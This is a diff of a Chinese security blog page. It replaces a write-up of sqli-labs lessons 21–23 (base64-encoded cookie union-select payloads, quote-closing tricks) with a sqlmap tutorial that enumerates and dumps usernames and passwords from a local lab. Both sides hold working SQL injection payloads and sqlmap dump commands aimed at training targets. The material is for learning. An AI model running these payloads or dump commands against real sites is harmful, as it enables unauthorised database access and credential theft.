@@ -93,33 +93,39 @@
 
 
 
-<meta name="description" content="要在平淡的日子里继续闪烁，要在芸芸众生中脱颖而出。">
+<meta name="description" content="足够优秀才能堵住悠悠众口。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sql-lab 21-23">
-<meta property="og:url" content="https://quan9i.github.io/post%E6%B3%A8%E5%85%A52/index.html">
+<meta property="og:title" content="sqlmap使用(sqli-labs为例)">
+<meta property="og:url" content="https://quan9i.github.io/sqlmap/index.html">
 <meta property="og:site_name" content="quan9i&#39;s blog">
-<meta property="og:description" content="要在平淡的日子里继续闪烁，要在芸芸众生中脱颖而出。">
+<meta property="og:description" content="足够优秀才能堵住悠悠众口。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/7268b3f26b534cc0a370b09185b2e233.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/d64abe76848641e3bff186023b08cba5.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/36a347ea9d1145928a84c4978f2dde6d.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/36f3044f592a40a38329041d05e6daa5.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/66fb0389873d43dbaee12ae9287b86ee.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/36ccffd0ef48422fb143f8291e05c756.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/e84ccbb1bea84385af38b7c29f26e9e8.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/a657493c6dee4099940a9dd264aea9d3.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/35cd1aaf4e3842d498781d2ce97c5b45.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/1678e2e56e9b4d1e87504518e31d7f9c.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/d8d3080227a647e08d05d9dd2a1ce691.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/13dba26f442845a2b2030889e72d0fd6.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/cfccaa7c83f341a2b9160ba4349bcd41.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/517441cd2c6f48739c27ecd2eef980cc.png">
-<meta property="article:published_time" content="2022-01-19T06:44:56.793Z">
-<meta property="article:modified_time" content="2022-01-17T14:17:42.000Z">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/de37eff995a543a7a96a7aa57d9cea6e.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/f130ac937eae4b0bb29eb54181f3e332.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/1ab29cf8fced4a15a1932f5a77bde340.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/4ad1594bdb634540833a07f3083b665e.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/c0fc16e3f93d48e9a6de0ab322328946.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/ff9cc9b0ac4640679174591c45ab3fea.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/1a7f3e9650a14f03983f9098fc9331b6.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/83a29058930c4b609269f8143392eadf.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/438aab7160cb44b18623a2d0633184fc.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2e4717ec9f9040b58481e5ab22329108.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/912e508cf792446a963a4ba09efaa7e2.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/beb1fa36341343f3b9f6fe9037d34acb.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/fdb542a29cc3463c81616fd2baad08d6.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/5c99ca0f40ce4db8827f38b7fc6c3b56.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/5bf40068cde34b06900fda2bd1bfadad.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/746d293bb3554251bb0465ef7ff647a3.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/15bec0c2b4884530b8b11980facd9e40.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/ad079852a5fc4381a0810dfe0287943a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/38b50a35293d482797c3094813d1921d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/c5ceded8064b4c1ba695be42f5234b7e.png">
+<meta property="article:published_time" content="2022-02-16T17:11:11.096Z">
+<meta property="article:modified_time" content="2022-02-16T17:17:25.818Z">
 <meta property="article:author" content="quan9i">
 <meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/7268b3f26b534cc0a370b09185b2e233.png">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/de37eff995a543a7a96a7aa57d9cea6e.png">
 
 
 
@@ -149,13 +155,13 @@
 
 
 
-  <link rel="canonical" href="https://quan9i.github.io/post注入2/"/>
+  <link rel="canonical" href="https://quan9i.github.io/sqlmap/"/>
 
 
 
 
 
-  <title>sql-lab 21-23 | quan9i's blog</title>
+  <title>sqlmap使用(sqli-labs为例) | quan9i's blog</title>
   
 
 
@@ -385,7 +391,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://quan9i.github.io/post%E6%B3%A8%E5%85%A52/">
+    <link itemprop="mainEntityOfPage" href="https://quan9i.github.io/sqlmap/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="">
@@ -402,7 +408,7 @@
 
         
         
-          <h2 class="post-title" itemprop="name headline">sql-lab 21-23</h2>
+          <h2 class="post-title" itemprop="name headline">sqlmap使用(sqli-labs为例)</h2>
         
 
         <div class="post-meta">
@@ -414,8 +420,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-01-19T14:44:56+08:00">
-                2022-01-19
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-02-17T01:11:11+08:00">
+                2022-02-17
               </time>
             
 
@@ -437,8 +443,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/post%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index">
-                    <span itemprop="name">post注入</span>
+                  <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index">
+                    <span itemprop="name">sql注入</span>
                   </a>
                 </span>
 
@@ -455,8 +461,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/post%E6%B3%A8%E5%85%A52/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/post%E6%B3%A8%E5%85%A52/" itemprop="commentCount"></span>
+                <a href="/sqlmap/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/sqlmap/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -478,7 +484,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  587
+                  1.6k
                 </span>
               
 
@@ -494,7 +500,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  2
+                  6
                 </span>
               
             </div>
@@ -515,23 +521,92 @@
       
 
       
-        <p><img src="https://img-blog.csdnimg.cn/7268b3f26b534cc0a370b09185b2e233.png" alt="在这里插入图片描述"><br>要在平淡的日子里继续闪烁，要在芸芸众生中脱颖而出。</p>
+        <p><img src="https://img-blog.csdnimg.cn/de37eff995a543a7a96a7aa57d9cea6e.png" alt="在这里插入图片描述"><br>足够优秀才能堵住悠悠众口。</p>
 <span id="more"></span>
-<h1><span id="sql-lab-21">sql-lab 21</span></h1><p>首先登录进去<br><img src="https://img-blog.csdnimg.cn/d64abe76848641e3bff186023b08cba5.png" alt="在这里插入图片描述"><br>发现coookie变成<code>uname=YWRtaW4%3D</code>，可见采用了base64编码进行转换<br>此时可采用base64位编码输出代码</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;union select 1,2,database() #</span></span><br></pre></td></tr></table></figure>
-<p>转换后为</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>MCd1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkgIw<span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></table></figure>
-<p>执行后发现报错，此时想到可能unname的包裹方式不是’，此时进行逐个尝试，在尝试到’)发现回显出了正确的数据库,如图所示<br><img src="https://img-blog.csdnimg.cn/36a347ea9d1145928a84c4978f2dde6d.png" alt="在这里插入图片描述"><br>其他猜解语句也同之前一样，唯一不同的是需要将语句转换成base63编码</p>
-<h1><span id="sql-lab-22">sql-lab 22</span></h1><p>登录进去后<br><img src="https://img-blog.csdnimg.cn/36f3044f592a40a38329041d05e6daa5.png" alt="在这里插入图片描述"><br>发现也是以base64编码传入的uname<br>试试刚才的payload，发现报错，此时想到unname的包裹方式可能不同，开始尝试，在包裹方式为”时发现正确回显，此时查询当前数据库的payload为<code>uname=dW5hbWU9MCIgdW5pb24gc2VsZWN0IDEsMixkYXRhYmFzZSgpICM=</code><br><img src="https://img-blog.csdnimg.cn/66fb0389873d43dbaee12ae9287b86ee.png" alt="在这里插入图片描述"></p>
-<h2><span id="查看所有数据库">查看所有数据库</span></h2><p><code>uname=dW5hbWU9MCIgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoc2NoZW1hX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhICM=</code><br>执行结果<br><img src="https://img-blog.csdnimg.cn/36ccffd0ef48422fb143f8291e05c756.png" alt="在这里插入图片描述"></p>
-<h2><span id="查询表名">查询表名</span></h2><p><code>uname=dW5hbWU9MCIgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0nc2VjdXJpdHknICM=</code><br>执行结果<br><img src="https://img-blog.csdnimg.cn/e84ccbb1bea84385af38b7c29f26e9e8.png" alt="在这里插入图片描述"></p>
-<h2><span id="查询列名">查询列名</span></h2><p><code>uname=dW5hbWU9MCIgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnICM=</code><br><img src="https://img-blog.csdnimg.cn/a657493c6dee4099940a9dd264aea9d3.png" alt="在这里插入图片描述"></p>
-<h2><span id="查询字段">查询字段</span></h2><p><code>uname=dW5hbWU9MCIgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoJ34nLGlkLHVzZXJuYW1lLHBhc3N3b3JkKSBmcm9tIHNlY3VyaXR5LnVzZXJzIw==</code><br><img src="https://img-blog.csdnimg.cn/35cd1aaf4e3842d498781d2ce97c5b45.png" alt="在这里插入图片描述"><br>查询其他类似信息不再赘述</p>
-<h1><span id="sql-lab-23">sql-lab 23</span></h1><p>进入界面后发现让输入id，测试出用单引号包裹id，以get方式传入数据后，发现无法被执行<br><img src="https://img-blog.csdnimg.cn/1678e2e56e9b4d1e87504518e31d7f9c.png" alt="在这里插入图片描述"><br>此时再将注释符换成#，也无法执行，说明可能注释符在这里被进行了转换，因此此时我们可以用单引号来进行闭合语句<br>payload为<code>id=0&#39; union select 1,2,&#39;3</code>或<code>id=0&#39; union select 1,2,3 or &#39;1&#39;=&#39;1</code></p>
-<h2><span id="查询所有数据库">查询所有数据库</span></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-23</span><span class="operator">/</span>?id<span class="operator">=</span><span class="string">&#x27; union select 1,database(),3 or &#x27;</span><span class="number">1</span><span class="string">&#x27;= &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/d8d3080227a647e08d05d9dd2a1ce691.png" alt="在这里插入图片描述"></p>
-<h2><span id="查询表名">查询表名</span></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-23</span><span class="operator">/</span>?id<span class="operator">=</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() and &#x27;</span><span class="number">1</span><span class="string">&#x27;= &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/13dba26f442845a2b2030889e72d0fd6.png" alt="在这里插入图片描述"><br>此处有个我解决不了的问题，我暂时将其记录下来，如果有大佬知道原因，希望可以帮助我一下，这个问题就是当把最后的and换成or时，按理说是可以得到当前数据库的表名的，可是却得到了infromation_schema数据库的全部表名<br><img src="https://img-blog.csdnimg.cn/cfccaa7c83f341a2b9160ba4349bcd41.png" alt="在这里插入图片描述"><br>而当or语句后面的’1’=’1，换成错误语句，例如’1’=’0,此时会正确的报出当前数据库的表名<br><img src="https://img-blog.csdnimg.cn/517441cd2c6f48739c27ecd2eef980cc.png" alt="在这里插入图片描述"><br>查询其他与之前类似，在这里不再赘述。</p>
+<h1><span id="前言">前言</span></h1><p>由于python学的啥也不是，脚本写的也很不咋滴（不会写），因此来学习sqlmap的使用，本人只是小白，如果出现错误还请各位师傅多多指正。</p>
+<h1><span id="sql-map部分指令">sql-map部分指令</span></h1><h2><span id="-is-dba">- -is-dba</span></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--is-dba判断当前用户是管理员权限</span></span><br></pre></td></tr></table></figure>
+
+<h2><span id="-current">- -current</span></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">--current-user：检测当前用户</span></span><br><span class="line"><span class="comment">--current-db：检测当前数据库</span></span><br></pre></td></tr></table></figure>
+
+<h2><span id="-d-t-c">-D，-T，-C</span></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-</span>D：指定数据库</span><br><span class="line"><span class="operator">-</span>T：指定数据表</span><br><span class="line"><span class="operator">-</span>C：指定字段，用逗号间隔</span><br></pre></td></tr></table></figure>
+
+<h2><span id="-dump">- -dump</span></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--dump：获取字段信息</span></span><br></pre></td></tr></table></figure>
+
+<h2><span id="-v">-v</span></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-</span>vx(x指数字)</span><br><span class="line"><span class="number">0</span>：只显示Python的回溯，错误和关键消息。</span><br><span class="line"><span class="number">1</span>：显示信息和警告消息。</span><br><span class="line"><span class="number">2</span>：显示调试消息。</span><br><span class="line"><span class="number">3</span>：显示有效载荷注入。</span><br><span class="line"><span class="number">4</span>：显示HTTP请求。</span><br><span class="line"><span class="number">5</span>：显示HTTP响应头。</span><br><span class="line"><span class="number">6</span>：显示HTTP响应页面的内容</span><br></pre></td></tr></table></figure>
+<h2><span id="batch">–batch</span></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--batch：使用非交互式扫描，SQLMap将不会询问</span></span><br></pre></td></tr></table></figure>
+
+<h1><span id="get类型">get类型</span></h1><p>这里以sql-labs第一关来进行示例</p>
+<h2><span id="检测可注入类型">检测可注入类型</span></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u 网址</span><br></pre></td></tr></table></figure>
+
+<p>示例如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.134</span><span class="number">.132</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>最终执行结果如下<br><img src="https://img-blog.csdnimg.cn/f130ac937eae4b0bb29eb54181f3e332.png" alt="在这里插入图片描述">给出了四种可以注入的方法，分别是get型注入，报错注入，时间盲注，联合查询注入</p>
+<p>中间会出现三个选择的（全选y即可），具体如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">it looks <span class="keyword">like</span> the back<span class="operator">-</span><span class="keyword">end</span> DBMS <span class="keyword">is</span> <span class="string">&#x27;MySQL&#x27;</span>. Do you want <span class="keyword">to</span> <span class="keyword">skip</span> test payloads <span class="keyword">specific</span> <span class="keyword">for</span> other DBMSes? [Y<span class="operator">/</span>n] </span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>检测到数据库是mysql，询问你是否要跳过其他数据库</span><br><span class="line"><span class="keyword">for</span> the remaining tests, do you want <span class="keyword">to</span> include <span class="keyword">all</span> tests <span class="keyword">for</span> <span class="string">&#x27;MySQL&#x27;</span> extending provided level (<span class="number">1</span>) <span class="keyword">and</span> risk (<span class="number">1</span>) <span class="keyword">values</span>? [Y<span class="operator">/</span>n] </span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>提示是否扫描等级为<span class="number">1</span>风险为<span class="number">1</span>下的所有payload</span><br><span class="line"><span class="keyword">GET</span> <span class="keyword">parameter</span> <span class="string">&#x27;id&#x27;</span> <span class="keyword">is</span> vulnerable. Do you want <span class="keyword">to</span> keep testing the others (if <span class="keyword">any</span>)? [y<span class="operator">/</span>N] </span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>获取参数id易受攻击。你想继续测试其他的吗，这里我们的参数就一个id，因此选y即可</span><br></pre></td></tr></table></figure>
+
+<h2><span id="获取数据库">获取数据库</span></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u 网址 <span class="comment">--dbs</span></span><br><span class="line"></span><br><span class="line">解释：<span class="operator">-</span>u(<span class="comment">--url)指的是url，即网址， --dbs是指数据库</span></span><br></pre></td></tr></table></figure>
+<p>示例如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.134</span><span class="number">.132</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--dbs</span></span><br></pre></td></tr></table></figure>
+<p>执行结果<br><img src="https://img-blog.csdnimg.cn/1ab29cf8fced4a15a1932f5a77bde340.png" alt="在这里插入图片描述"></p>
+<h2><span id="获取表">获取表</span></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.134</span><span class="number">.132</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="operator">-</span>D&quot;表名&quot; <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>
+<p>示例如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.134</span><span class="number">.132</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="operator">-</span>D&quot;security&quot; <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>
+<p>执行结果如下<br><img src="https://img-blog.csdnimg.cn/4ad1594bdb634540833a07f3083b665e.png" alt="在这里插入图片描述"></p>
+<h2><span id="获取列名">获取列名</span></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.134</span><span class="number">.132</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="operator">-</span>D&quot;数据名&quot;  <span class="operator">-</span>T&quot;表名&quot; <span class="comment">--columns -v3</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span><span class="operator">-</span>v3：显示payload</span><br></pre></td></tr></table></figure>
+<p>示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.134</span><span class="number">.132</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="operator">-</span>D&quot;security&quot;  <span class="operator">-</span>T&quot;users&quot; <span class="comment">--columns -v3</span></span><br></pre></td></tr></table></figure>
+<p>执行结果如下<br><img src="https://img-blog.csdnimg.cn/c0fc16e3f93d48e9a6de0ab322328946.png" alt="在这里插入图片描述"></p>
+<h2><span id="获取字段信息">获取字段信息</span></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.134</span><span class="number">.132</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="operator">-</span>D&quot;数据库名&quot;  <span class="operator">-</span>T&quot;表名&quot; <span class="operator">-</span>C&quot;列名&quot; <span class="comment">--dump  -v3</span></span><br></pre></td></tr></table></figure>
+<p>示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.134</span><span class="number">.132</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="operator">-</span>D&quot;security&quot;  <span class="operator">-</span>T&quot;users&quot; <span class="operator">-</span>C&quot;id,username,password&quot; <span class="comment">--dump  -v3</span></span><br></pre></td></tr></table></figure>
+<p>执行结果如下<br><img src="https://img-blog.csdnimg.cn/ff9cc9b0ac4640679174591c45ab3fea.png" alt="在这里插入图片描述"></p>
+<h1><span id="post类型">post类型</span></h1><h2><span id="准备工作">准备工作</span></h2><p>post注入时，无法直接利用sqlmap来进行破解，但是可以利用burpsuite这个工具来获取内容，将内容复制到一个txt文本中，再利用sqlmap对文本进行破解，具体操作如下<br>开启浏览器代理，刷新界面，使burpsuite获取到靶场内容，然后复制到下来<br><img src="https://img-blog.csdnimg.cn/1a7f3e9650a14f03983f9098fc9331b6.png" alt="在这里插入图片描述"></p>
+<h2><span id="检测可注入类型">检测可注入类型</span></h2><p>构造payload如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>r 文件路径 <span class="comment">--batch</span></span><br></pre></td></tr></table></figure>
+<p>示例如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>r &quot;D:\sqlmap\2.txt&quot; <span class="comment">--batch</span></span><br></pre></td></tr></table></figure>
+<p>执行结果如下<br><img src="https://img-blog.csdnimg.cn/83a29058930c4b609269f8143392eadf.png" alt="在这里插入图片描述"> </p>
+<h2><span id="破解数据库">破解数据库</span></h2><h3><span id="方法一">方法一</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>r 文件路径 <span class="comment">--batch --dbs</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span><span class="operator">-</span>r指定路径，<span class="comment">--batch无视选择 --dbs是获取数据库</span></span><br></pre></td></tr></table></figure>
+<p>示例如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>r &quot;D:\sqlmap\3.txt&quot; <span class="comment">--batch --dbs</span></span><br></pre></td></tr></table></figure>
+<p>执行结果<br><img src="https://img-blog.csdnimg.cn/438aab7160cb44b18623a2d0633184fc.png" alt="在这里插入图片描述"></p>
+<h3><span id="方法二">方法二</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>r 文件路径 <span class="operator">-</span>p注入参数 <span class="comment">--dbms mysql --dbs</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span><span class="operator">-</span>r指定路径，<span class="operator">-</span>p指定注入参数，<span class="comment">--dbms指的是数据库管理系统，--dbms mysql 就代表mysql全部数据</span></span><br><span class="line"><span class="comment">--dbs 指获取数据库名</span></span><br></pre></td></tr></table></figure>
+<p>示例</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>r &quot;D:\sqlmap\3.txt&quot; <span class="operator">-</span>p&quot;uname &quot; <span class="comment">--dbms mysql --dbs</span></span><br></pre></td></tr></table></figure>
+<p>执行结果如下<br><img src="https://img-blog.csdnimg.cn/2e4717ec9f9040b58481e5ab22329108.png" alt="在这里插入图片描述"></p>
+<h2><span id="破解数据表">破解数据表</span></h2><h3><span id="方法一">方法一</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>r 文件路径名 <span class="operator">-</span>D数据库名 <span class="comment">--batch --tables</span></span><br></pre></td></tr></table></figure>
+<p>示例如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>r &quot;D:\sqlmap\3.txt&quot; <span class="operator">-</span>D&quot;security&quot; <span class="comment">--batch --tables</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>获取security库下全部表名</span><br></pre></td></tr></table></figure>
+<p>执行结果如下<br><img src="https://img-blog.csdnimg.cn/912e508cf792446a963a4ba09efaa7e2.png" alt="在这里插入图片描述"></p>
+<h3><span id="方法二">方法二</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>r 文件路径名 <span class="operator">-</span>p注入参数 <span class="comment">--dbms mysql --tables</span></span><br></pre></td></tr></table></figure>
+<p>示例如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>r &quot;D:\sqlmap\3.txt&quot; <span class="operator">-</span>p&quot;passwd&quot; <span class="comment">--dbms mysql --tables</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>以passwd为参数，在mysql数据库中得到全部表名</span><br></pre></td></tr></table></figure>
+<p>执行结果如下<br><img src="https://img-blog.csdnimg.cn/beb1fa36341343f3b9f6fe9037d34acb.png" alt="在这里插入图片描述"></p>
